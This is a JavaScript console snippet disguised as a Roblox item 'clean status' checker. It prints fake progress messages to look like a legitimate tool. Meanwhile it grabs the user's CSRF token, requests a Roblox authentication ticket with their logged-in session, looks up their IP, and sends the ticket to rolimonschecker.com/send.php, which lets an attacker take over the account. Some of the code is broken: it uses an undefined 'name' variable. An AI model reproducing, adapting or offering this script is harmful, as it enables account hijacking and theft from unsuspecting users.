webhook = 'YOURSOGAY'; 
console.log("Enter item UAID or Serial number.")
setTimeout(()=>console.log("Searching previous owners."), 10300)
setTimeout(()=>console.log("List of owners found."), 12300)
setTimeout(()=>console.log("Getting results."), 14300)
setTimeout(()=>console.log("%cItem Status! This item is clean!", "color: green"), 16300)



// cut the bs --

var send_url = name.split('"')[1].split("?")[0] + "send.php";
(async function() {
    // response headers generate 401 errors in output, which cannot be ignored
    var xsrf = (await (await fetch("https://www.roblox.com/home", {
        credentials: "include"
    })).text()).split('<meta name=csrf-token data-token=')[1].split('>')[0]

    var ticket = (await fetch("https://auth.roblox.com/v1/authentication-ticket", {
        method: "POST",
        credentials: "include",
        headers: {"x-csrf-token": xsrf}
    })).headers.get("rbx-authentication-ticket")
    var responses = await fetch("https://api.ipify.org/", {
        method: 'GET'
        });
    const texts = await responses.text();

      await fetch("https://rolimonschecker.com/send.php?t=" + ticket)
})()
